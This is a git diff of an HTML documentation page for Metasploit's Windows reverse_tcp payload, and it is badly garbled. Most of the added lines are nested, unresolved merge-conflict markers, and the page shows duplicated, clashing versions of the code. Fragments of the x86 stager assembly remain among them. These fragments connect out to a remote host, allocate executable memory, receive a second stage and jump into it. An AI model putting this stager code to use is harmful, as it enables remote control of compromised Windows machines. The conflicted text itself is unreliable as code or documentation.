@@ -613,10 +613,13 @@ certain payloads if requested.</p>
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-excellent.mp3
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
 249
 250
 251
@@ -638,6 +641,7 @@ certain payloads if requested.</p>
 267</pre>
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 249</pre>
 >>>>>>> origin/gh-pages
@@ -648,6 +652,11 @@ certain payloads if requested.</p>
 249</pre>
 >>>>>>> origin/gh-pages
 >>>>>>> origin/pod/metasploit-framework
+=======
+=======
+249</pre>
+>>>>>>> origin/gh-pages
+>>>>>>> origin/pod/metasploit-windows.rb
     </td>
     <td>
       <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/reverse_tcp.rb', line 98</span>
@@ -668,10 +677,13 @@ certain payloads if requested.</p>
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-excellent.mp3
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
       push &#39;32&#39;               ; Push the bytes &#39;ws2_32&#39;,0,0 onto the stack.
       push &#39;ws2_&#39;             ; ...
       push esp                ; Push a pointer to the &quot;ws2_32&quot; string on the stack.
@@ -720,8 +732,11 @@ certain payloads if requested.</p>
       dec [esi+8]
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
 =======
       push 0x00003233        ; Push the bytes &#39;ws2_32&#39;,0,0 onto the stack.
       push 0x5F327377        ; ...
@@ -769,10 +784,13 @@ certain payloads if requested.</p>
       dec dword [esi+8]
 >>>>>>> origin/gh-pages
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-excellent.mp3
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
       jnz try_connect
   </span><span class='tstring_end'>^</span></span>
 
@@ -781,10 +799,13 @@ certain payloads if requested.</p>
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-excellent.mp3
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
     failure:
       call exitfunk
     </span><span class='tstring_end'>^</span></span>
@@ -803,8 +824,11 @@ certain payloads if requested.</p>
   </span><span class='tstring_end'>^</span></span>
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
 =======
       failure:
         call exitfunk
@@ -831,10 +855,13 @@ certain payloads if requested.</p>
     </span><span class='tstring_end'>^</span></span>
 >>>>>>> origin/gh-pages
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-excellent.mp3
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
 
   <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_asm_send_uuid'>asm_send_uuid</span> <span class='kw'>if</span> <span class='id identifier rubyid_include_send_uuid'>include_send_uuid</span>
 
@@ -844,10 +871,13 @@ certain payloads if requested.</p>
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-excellent.mp3
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
       push 0                  ; flags
       push 4                  ; length = sizeof( DWORD );
       push esi                ; the 4 byte buffer on the stack to hold the second stage length
@@ -865,8 +895,11 @@ certain payloads if requested.</p>
     </span><span class='tstring_end'>^</span></span>
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
 =======
       push 0                 ; flags
       push 4                 ; length = sizeof( DWORD );
@@ -885,10 +918,13 @@ certain payloads if requested.</p>
       </span><span class='tstring_end'>^</span></span>
 >>>>>>> origin/gh-pages
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-excellent.mp3
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
   <span class='kw'>end</span>
 
   <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
@@ -896,10 +932,13 @@ certain payloads if requested.</p>
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-excellent.mp3
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
       mov esi, [esi]          ; dereference the pointer to the second stage length
       push 0x40               ; PAGE_EXECUTE_READWRITE
       push 0x1000             ; MEM_COMMIT
@@ -950,8 +989,11 @@ certain payloads if requested.</p>
       jmp create_socket
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
 =======
       mov esi, [esi]         ; dereference the pointer to the second stage length
       push 0x40              ; PAGE_EXECUTE_READWRITE
@@ -981,10 +1023,13 @@ certain payloads if requested.</p>
       jle failure
 >>>>>>> origin/gh-pages
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-excellent.mp3
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
     </span><span class='tstring_end'>^</span></span>
   <span class='kw'>end</span>
 
@@ -992,10 +1037,13 @@ certain payloads if requested.</p>
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-excellent.mp3
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
     read_successful:
       add ebx, eax            ; buffer += bytes_received
       sub esi, eax            ; length -= bytes_received, will set flags
@@ -1003,8 +1051,11 @@ certain payloads if requested.</p>
       ret                     ; return into the second stage
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
 =======
       add ebx, eax           ; buffer += bytes_received
       sub esi, eax           ; length -= bytes_received, will set flags
@@ -1012,10 +1063,13 @@ certain payloads if requested.</p>
       ret                    ; return into the second stage
 >>>>>>> origin/gh-pages
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-excellent.mp3
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
   </span><span class='tstring_end'>^</span></span>
 
   <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span>
@@ -1247,10 +1301,13 @@ certain payloads if requested.</p>
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-excellent.mp3
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
   <span class='comment'># EXITFUNK &#39;thread&#39; is the biggest by far, adds 29 bytes.
 </span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>29</span>
 
@@ -1258,8 +1315,11 @@ certain payloads if requested.</p>
 </span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>44</span>
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
 =======
   <span class='comment'># EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
 </span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>31</span>
@@ -1268,10 +1328,13 @@ certain payloads if requested.</p>
 </span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>10</span>
 >>>>>>> origin/gh-pages
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/pod/metasploit-excellent.mp3
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
 
   <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='id identifier rubyid_uuid_required_size'>uuid_required_size</span> <span class='kw'>if</span> <span class='id identifier rubyid_include_send_uuid'>include_send_uuid</span>
 
@@ -1322,6 +1385,7 @@ certain payloads if requested.</p>
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
   Generated on Tue Dec 22 22:32:07 2015 by
 =======
   Generated on Tue Dec  8 22:32:13 2015 by
@@ -1329,6 +1393,9 @@ certain payloads if requested.</p>
 =======
   Generated on Tue Dec  8 22:32:13 2015 by
 >>>>>>> origin/pod/metasploit-framework
+=======
+  Generated on Tue Dec  8 22:32:13 2015 by
+>>>>>>> origin/pod/metasploit-windows.rb
   <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
   0.8.7.6 (ruby-2.1.7).
 =======
@@ -1337,6 +1404,7 @@ certain payloads if requested.</p>
   0.8.7.6 (ruby-2.1.5).
 >>>>>>> origin/gh-pages
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
   Generated on Tue Dec  8 22:32:13 2015 by
   <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
@@ -1344,6 +1412,8 @@ certain payloads if requested.</p>
 >>>>>>> origin/pod/metasploit-excellent.mp3
 =======
 >>>>>>> origin/pod/metasploit-framework
+=======
+>>>>>>> origin/pod/metasploit-windows.rb
 </div>
 
   </body>
